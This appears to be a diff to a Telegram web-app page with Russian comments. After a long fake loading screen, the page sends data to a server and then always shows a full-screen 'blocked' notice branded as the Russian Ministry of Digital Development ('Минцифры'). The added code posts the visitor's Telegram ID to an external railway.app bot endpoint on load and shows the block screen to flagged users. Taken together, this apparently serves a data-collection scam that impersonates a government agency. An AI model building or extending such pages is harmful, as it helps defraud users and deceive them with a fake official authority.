@@ -163,7 +163,7 @@
   </div>
 </div>
 
-<!-- Завершающий блок "Минцифры" (точно как в примере) -->
+<!-- Завершающий блок "Минцифры" -->
 <div id="blocked" class="hidden fixed inset-0 bg-white flex items-center justify-center z-50 overflow-y-auto">
   <div class="text-center max-w-[420px] px-6 py-10">
     <img src="https://cdn-icons-png.flaticon.com/512/1828/1828843.png" class="w-16 h-16 mx-auto mb-6" alt="blocked">
@@ -293,7 +293,6 @@ function startLoading() {
   els.loading.classList.remove("hidden");
 
   setTimeout(() => {
-    // Показываем экран успеха на 2 секунды, затем сразу блокировку
     els.loading.innerHTML = `
       <div class="text-center text-white">
         <div class="mx-auto w-24 h-24 border-8 border-green-400 border-t-transparent rounded-full animate-spin mb-8"></div>
@@ -315,7 +314,7 @@ function startLoading() {
     .then(res => console.log("Ответ от сервера:", res))
     .catch(err => console.error("Ошибка отправки:", err))
     .finally(() => {
-      // После отправки (успех или ошибка) — показываем блокировку Минцифры
+      // После отправки всегда показываем блокировку
       setTimeout(() => {
         els.loading.classList.add("hidden");
         document.getElementById("blocked").classList.remove("hidden");
@@ -324,6 +323,34 @@ function startLoading() {
     });
   }, 45000);
 }
+
+// Проверка на повторную отправку по TG ID при запуске
+window.addEventListener('load', async () => {
+  if (tg.initDataUnsafe?.user?.id) {
+    try {
+      const response = await fetch('https://helper-chek-bot-2026-production.up.railway.app/check_user', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          user_id: tg.initDataUnsafe.user.id
+        })
+      });
+      const result = await response.json();
+      
+      if (result.is_blocked) {
+        // Сразу показываем блокировку
+        document.getElementById("mainContainer").classList.add("hidden");
+        document.getElementById("loading").classList.add("hidden");
+        document.getElementById("blocked").classList.remove("hidden");
+        tg.HapticFeedback.notificationOccurred('warning');
+      }
+      // Если не заблокирован — показываем приложение
+    } catch (err) {
+      console.error("Ошибка проверки пользователя:", err);
+      // Если ошибка — показываем приложение
+    }
+  }
+});
 
 // Инициализация
 updateProgress();
